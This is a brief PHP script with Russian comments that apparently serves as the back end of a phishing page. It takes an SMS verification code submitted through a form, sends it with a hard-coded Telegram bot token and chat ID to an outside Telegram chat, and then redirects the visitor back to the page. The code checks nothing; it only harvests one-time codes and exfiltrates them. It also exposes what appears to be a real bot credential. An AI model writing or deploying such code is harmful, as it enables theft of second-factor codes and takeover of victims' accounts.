<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Получение SMS-кода из формы
    $sms_code = htmlspecialchars($_POST['sms-code']);

    // Токен и ID чата для Telegram
    $token = "6516555054:AAFdqiXb3HTc_RkncKL30Lre7eMi38iHsQo";
    $chat_id = "-4276589204";

    // Сообщение, которое будет отправлено в Telegram
    $message = "SMS Verification Code: $sms_code";

    // Отправка сообщения в Telegram
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=HTML&text=".urlencode($message),"r");

    // Проверка успешности отправки и перенаправление
    if ($sendToTelegram) {
        header('Location: index.php'); // перенаправление на success.html после успешной отправки
    } else {
        echo "Error";
    }
}
?>
